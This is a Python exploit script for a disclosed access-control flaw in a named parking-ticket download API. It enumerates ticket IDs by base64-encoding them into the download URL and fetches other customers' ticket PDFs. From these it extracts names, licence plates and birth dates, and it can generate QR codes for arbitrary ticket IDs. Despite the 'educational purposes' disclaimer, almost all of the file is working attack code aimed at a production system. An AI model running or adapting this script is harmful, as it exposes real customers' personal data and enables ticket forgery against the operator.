# exploit.py - Base script for exploiting PTG-2020-0010. Serves both as a library and command line interface executable

# This script executes and/or uses a disclosed exploit on a production system. Do not use the script unethically. It is published for educational purposes only.
# Code is published in the public domain. Check LICENSE file.

# URL Structure https://api.parkingshop.com/online/ticket/download/<base64>ticketID/<base64>useMessageID/<base64>typeMsg

# Lib imports
import requests
from PIL import Image
import json
import sys
import base64
import datetime
import qrcode

from io import BytesIO

import PyPDF2


# Config
typeMsg:str = "pwned ticket"
fieldlen:int = 9


def b64enc(instr:str):
    return str(base64.b64encode(bytes(instr, encoding='utf-8')), encoding='utf-8')

def getdigitcount(i:int):
    x = 0
    while(i > 0):
        i = i // 10
        x += 1
    return x

class Ticket():
    def __init__(self, _id:int, _startdate:datetime.date, _enddate:datetime.date, _kenteken:str = None, _name:str = None, _birthdate:datetime.date = None):
        self.id = _id
        self.startdate = _startdate
        self.enddate = _enddate
        self.kenteken = _kenteken
        self.name = _name
        self.birthdate = _birthdate

    def GetQRimg(self):
        c = getdigitcount(self.id)
        ddiff = fieldlen - c
        dstr = ""
        for x in range(0, ddiff):
            dstr = f"{dstr}0"
        data = f"{dstr}{self.id}"
        return qrcode.make(data, error_correction=1)

    def __str__(self):
        d = {}
        d['id'] = self.id
        d['startdate'] = str(self.startdate)
        d['enddate'] = str(self.enddate)
        d['kenteken'] = self.kenteken
        d['name'] = self.name
        d['birthdate'] = str(self.birthdate)

        #b = BytesIO()
        #self.GetQRimg().save(b, format='PNG')

        #d['qr_payload'] = str(base64.b64encode(b.getvalue()))
        return json.dumps(d)

def GetTicketPDF(_ticketID:int, _typemsg:str = typeMsg, _useMessageId:int = 4):
     tis = str(_ticketID)
     ums = str(_useMessageId)
     
     targetURL = f"https://api.parkingshop.com/online/ticket/download/{b64enc(tis)}/{b64enc(ums)}/{b64enc(_typemsg)}"
     r = requests.get(targetURL)
     if(r.status_code != 200):
         # Site gelocked XD
         return r.status_code
     try:
         
         return PyPDF2.PdfFileReader(BytesIO(r.content))
     except PyPDF2.utils.PdfReadError:
         
         return None

def GetTicket(_ticketID):
    
    r = GetTicketPDF(_ticketID)
    if (not r == None and not isinstance(r, int)):
        
        s = r.getPage(0).extractText()
        lines = s.split('\n')
        ari = lines.index('Aankomst mogelijk vanaf 8:30 uur ')
        startd = datetime.datetime.strptime(lines[ari + 1].strip(), '%d/%m/%Y')
        startdate = startd.date()

        vri = lines.index('Vertrek voor zonsondergang ')
        endd = datetime.datetime.strptime(lines[vri + 1].strip(), '%d/%m/%Y')
        enddate = endd.date()
        kent = None
        name = None
        birthdate = None
        try:
            keni = lines.index('Voertuig:')
            kent = lines[keni + 1]
        except ValueError:
            pass
        
        try: 
            nami = lines.index('Hallo ')
            if(not 'Reservering' in lines[nami + 1]):
                name = lines[nami + 1].strip()
        except ValueError:
            pass
        try:
            birthdai = lines.index("Geboorte datum: ")
            birthdate = endd = datetime.datetime.strptime(lines[birthdai + 1].strip(), '%d/%m/%Y')
            birthdate = birthdate.date()
        except ValueError:
            pass
        

        return Ticket(_ticketID, startdate, enddate, kent, name, birthdate) 
    else:
        return r

def argumentparse():
    id = None
    output = None
    js = False
    for i in range(0, len(sys.argv)):
        if(sys.argv[i] == '-i'):
            id = int(sys.argv[i + 1])
        elif(sys.argv[i] == '-o'):
            output = str(sys.argv[i+1])
        elif(sys.argv[i] == '--json'):
            js = True
        elif(sys.argv[i] == '--gen-url'):
            js = 2
    return (id, output, js)


# main func
if __name__ == "__main__":
    args = argumentparse()
    if(args[0] == None):
        print("\033[91m[!] ID Required \033[0m")
        exit(1)
    if(args[1] == None and not args[2]):
        print("\033[91m[!] PDF output requires output filename \033[0m")
        exit(1)
    
    
    if(args[2] == True):
        res = GetTicket(args[0])
        if(res == None):
            print('\033[91m[!] File fetch failed!\033[0m')
            exit(1)
        elif(isinstance(res, int)):
            print(f'\033[91m[!] Site returned bad status code: {res}')
            exit(1)
        # Convert to JSON
        jss = str(res)
        
        if(args[1] != None):
            with open(f'{args[1]}.json', 'w', encoding = 'utf-8') as f:
                f.write(jss)
                f.close()
                print('\033[94m[*]\033[0m Output file write OK')
        else:
            print("\033[93m[!]\033[0m No output supplied!")
            print(jss)
    elif(args[2] == 2):
        t = "pwned"
        print(f"https://api.parkingshop.com/online/ticket/download/{b64enc(str(args[0]))}/{b64enc('tryfuck')}/{b64enc('4')}")
        exit(0)
    else:
        res = GetTicketPDF(args[0])
        if(res == None):
            print('\033[91m[!] File fetch failed!\033[0m')
            exit(1)
        elif(isinstance(res, int)):
            print(f'\033[91m[!] Site returned bad status code: {res}')
            exit(1)
        print(f'\033[92m[*]\033[0m File fetch OK')
        wrt = PyPDF2.PdfFileWriter()

        wrt.addPage(res.getPage(0))

        with open(f'{args[1]}.pdf', 'wb') as fh:
            wrt.write(fh)
            fh.close()
            print('\033[94m[*]\033[0m Output file write OK')

